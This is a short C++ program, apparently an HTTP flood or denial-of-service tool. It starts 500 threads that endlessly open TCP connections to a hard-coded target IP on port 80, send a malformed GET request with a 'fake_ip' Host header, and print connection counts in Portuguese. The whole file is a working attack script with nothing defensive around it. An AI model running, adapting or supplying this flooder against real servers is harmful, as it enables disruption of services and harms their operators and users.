#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>

std::string target_ip = "192.168.15.1";
int target_port = 80;
std::string fake_ip = "172.24.10.23";
std::atomic<int> already_connected(0);

void attack() {
    while (true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);

        if (connect(sock, (sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
            std::string request = "GET / " + target_ip + " HTTP/1.1\r\n";
            request += "Host: " + fake_ip + "\r\n\r\n";

            send(sock, request.c_str(), request.length(), 0);
        }

        close(sock);

        int count = ++already_connected;
        if (count % 500 == 0) {
            std::cout << "Conexões feitas: " << count << std::endl;
        }
    }
}

int main() {
    const int THREADS = 500;
    std::vector<std::thread> threads;

    for (int i = 0; i < THREADS; ++i) {
        threads.emplace_back(attack);
    }

    for (auto& t : threads) {
        t.join();
    }

    return 0;
}
